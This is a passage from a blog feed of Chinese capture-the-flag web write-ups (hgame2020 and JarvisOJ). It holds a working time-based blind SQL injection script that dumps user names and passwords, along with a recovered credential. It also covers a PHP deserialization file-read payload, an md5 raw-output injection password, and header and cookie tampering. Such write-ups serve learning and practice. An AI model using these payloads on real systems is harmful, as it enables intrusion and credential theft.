class=&#34;hljs-selector-attr&#34;&gt;[227]&lt;/span&gt;&lt;br&gt;req = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;python reverse_mt_rand.py &amp;#x27;&lt;/span&gt;+str(R0)+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;+str(R227)+&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; 0 0&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt; = os&lt;span class=&#34;hljs-selector-class&#34;&gt;.popen&lt;/span&gt;(req)&lt;br&gt;x = &lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;hljs-selector-class&#34;&gt;.read&lt;/span&gt;()&lt;br&gt;&lt;span class=&#34;hljs-selector-tag&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;hljs-selector-class&#34;&gt;.close&lt;/span&gt;()&lt;br&gt;x = str(x&lt;span class=&#34;hljs-selector-class&#34;&gt;.replace&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;))&lt;br&gt;url2 = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;https://twoshot.hgame.n3ko.co/verify.php&amp;quot;&lt;/span&gt;&lt;br&gt;data = &amp;#123;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ans&amp;quot;&lt;/span&gt;:x&amp;#125;&lt;br&gt;final = s&lt;span class=&#34;hljs-selector-class&#34;&gt;.post&lt;/span&gt;(url = url2,cookies = cookie,data = data)&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(final.text)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;cosmos的二手市场&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmos的二手市场&#34;&gt;#&lt;/a&gt; Cosmos 的二手市场&lt;/h2&gt;
&lt;p&gt;条件竞争的题目，用 burp 发包，买入比卖出少一些，刷余额&lt;/p&gt;
&lt;h2 id=&#34;cosmos的留言板-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cosmos的留言板-2&#34;&gt;#&lt;/a&gt; Cosmos 的留言板 - 2&lt;/h2&gt;
&lt;p&gt;发现删除留言部分存在 sql 注入，由于没有回显，只能盲注&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/hgame2020/3.png&#34; alt=&#34;3&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;时间盲注脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;import time&lt;br&gt;&lt;br&gt;url = &amp;quot;http://139.199.182.61:19999/index.php?method=&lt;span class=&#34;hljs-keyword&#34;&gt;delete&lt;/span&gt;&amp;amp;delete_id=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;test = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;schema_name&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.schemata&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;group_concat(table_name)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.tables&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;group_concat(column_name)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;information_schema.columns&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;user&amp;#x27;&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,name,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;)&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;babysql.&lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;hljs-comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;cookie = &amp;#123;&amp;#x27;PHPSESSID&amp;#x27;:&amp;#x27;9g4b91gspvooe2up4k2blubbqo&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,20):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(33,127):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;,sleep(&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(data,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		print(chr(j))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t1 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload,cookies = cookie)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		t2 = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(t2-t1&amp;gt;=5):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;拿到账号密码，但是登陆提示错误，不知道是什么原因，多跑几次才拿到了正确的账号密码：cosmos^f1FXOCnj26Fkadzt4Sqynf6O7CgR&lt;/p&gt;
</content>
        <updated>2020-02-05T15:09:06.000Z</updated>
    </entry>
    <entry>
        <id>http://blog.m1n.me/2019/11/27/JarvisOj/</id>
        <title>JarvisOj</title>
        <link rel="alternate" href="http://blog.m1n.me/2019/11/27/JarvisOj/"/>
        <content type="html">&lt;p&gt;&lt;a href=&#34;https://www.jarvisoj.com/&#34;&gt;https://www.jarvisoj.com/&lt;/a&gt;&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web&#34;&gt;#&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&#34;localhost&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#localhost&#34;&gt;#&lt;/a&gt; LocalHost&lt;/h2&gt;
&lt;p&gt;抓包加一个 “X-Forwarded-For: 127.0.0.1&amp;quot; 完事&lt;/p&gt;
&lt;h2 id=&#34;port51&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#port51&#34;&gt;#&lt;/a&gt; PORT51&lt;/h2&gt;
&lt;p&gt;刚开始以为改端口就完了，，后来发现是我太菜了，要改我们的访问端口&lt;br&gt;
 &lt;code&gt;curl --loacl-port 51 http://web.jarvisoj.com:32770/&lt;/code&gt;  就拿到了 flag，，学到了&lt;/p&gt;
&lt;h2 id=&#34;神盾局的秘密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#神盾局的秘密&#34;&gt;#&lt;/a&gt; 神盾局的秘密&lt;/h2&gt;
&lt;p&gt;进去以后就是一张图片&lt;br&gt;
先 view-source 一下看到了：&lt;br&gt;
 &lt;code&gt;&amp;lt;img src=&amp;quot;showimg.php?img=c2hpZWxkLmpwZw==&amp;quot; width=&amp;quot;100%&amp;quot;/&amp;gt;&lt;/code&gt; &lt;br&gt;
 看到了一个 showimg.php，看样子应该可以用 img 这个参数来读文件，先读一下 showimg.php 这个文件，没看到啥有用的东西，再看一下 index.php 看到了有一个反序列化的点，看样子是反序列化的题目，源码：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;require_once&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;shield.php&amp;#x27;&lt;/span&gt;);&lt;br&gt;	&lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Shield();&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;class&amp;#x27;&lt;/span&gt;]) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;class&amp;#x27;&lt;/span&gt;];&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt;)) &amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt; = unserialize(&lt;span class=&#34;hljs-variable&#34;&gt;$g&lt;/span&gt;);&lt;br&gt;	&amp;#125;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$x&lt;/span&gt;-&amp;gt;readfile();&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;看到了 shield.php，读一下看看：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;//flag is in pctf.php&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Shield&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;		&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;;&lt;br&gt;		&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;			&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt; -&amp;gt; file = &lt;span class=&#34;hljs-variable&#34;&gt;$filename&lt;/span&gt;;&lt;br&gt;		&amp;#125;&lt;br&gt;		&lt;br&gt;		&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;readfile&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;			&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;hljs-keyword&#34;&gt;empty&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file) &amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;..&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt;  &lt;br&gt;			&amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;)===&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt; &amp;amp;&amp;amp; stripos(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;\\&amp;#x27;&lt;/span&gt;)==&lt;span class=&#34;hljs-literal&#34;&gt;FALSE&lt;/span&gt;) &amp;#123;&lt;br&gt;				&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; @file_get_contents(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;file);&lt;br&gt;			&amp;#125;&lt;br&gt;		&amp;#125;&lt;br&gt;	&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Shield&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;br&gt;	&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pctf.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; Shield();&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; serialize(&lt;span class=&#34;hljs-variable&#34;&gt;$c&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;“view-source:&lt;a href=&#34;http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:%7Bs:4:%22file%22;s:8:%22pctf.php%22;%7D&#34;&gt;http://web.jarvisoj.com:32768/index.php?class=O:6:“Shield”:1:{s:4:“file”;s:8:“pctf.php”;}&lt;/a&gt;”&lt;br&gt;
 就拿到了 flag&lt;/p&gt;
&lt;h2 id=&#34;login&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#login&#34;&gt;#&lt;/a&gt; Login&lt;/h2&gt;
&lt;p&gt;提示说需要密码才能拿到 flag，，但是测试了一下发现当输入双引号的时候会报 sql 错误，应该是存在 sql 注入，但是测试了好久没发现有什么用，，看了一眼 wp 要先抓包，，在 head 里面有 hint。。。&lt;br&gt;
‘Hint: &amp;quot;select * from  &lt;code&gt;admin&lt;/code&gt;  where password=’&amp;quot;.md5($pass,true).&amp;quot;’&amp;quot;’&lt;br&gt;
然后想到应该是 md5 的安全问题，0e 开头的问题应该是不存在，参考了一下 https://www.cnblogs.com/piaomiaohongchen/p/10659359.html&lt;br&gt;
 试了一下文中给出的密码 ffifdyop 就拿到了 flag&lt;/p&gt;
&lt;h2 id=&#34;admin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#admin&#34;&gt;#&lt;/a&gt; admin&lt;/h2&gt;
&lt;p&gt;打开网页只有一个 hello world，查看网页源代码没看到啥有用的东西，于是就看看有没有 robots.txt，看到了 admin_s3cr3t.php，访问拿到假的 flag，想了想应该是跟 cookie 有关，于是就抓包看看，应该是在 cookie 有判断是不是 admin，但是我抓到的包没有 cookie，反而是看到一个类似于 base64 的一串编码，就一直在搞这个也没搞出个啥，后来看了一下 wp 别人就有抓到 admin=0.。。。我就重新刷新重新抓了一下包才看到了这玩意，，改成 1 就拿到了 flag，看来应该是还没有设置 cookie 就被我抓包了，，，害，下次注意&lt;/p&gt;
&lt;h2 id=&#34;in-a-mess&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#in-a-mess&#34;&gt;#&lt;/a&gt; IN A mess&lt;/h2&gt;
&lt;p&gt;1. 查看网页源代码让我访问 index.phps，看到源码&lt;/p&gt;
